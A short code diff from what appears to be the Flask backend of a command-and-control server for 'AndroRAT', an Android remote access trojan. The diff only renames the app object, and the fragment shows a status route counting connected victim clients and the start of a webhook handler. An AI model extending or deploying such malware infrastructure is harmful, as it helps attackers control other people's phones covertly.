@@ -211,12 +211,12 @@ control_server = ControlServer()
 # Flask App
 # ============================================================
 
-flask_app = Flask(__name__)
+app = Flask(__name__)
 
-@flask_app.route('/')
+@app.route('/')
 def index(): return jsonify({"status":"running","bot":"AndroRAT","clients":len(control_server.clients),"server":control_server.running})
 
-@flask_app.route('/webhook', methods=['POST'])
+@app.route('/webhook', methods=['POST'])
 def webhook():
     global application
     if not application:
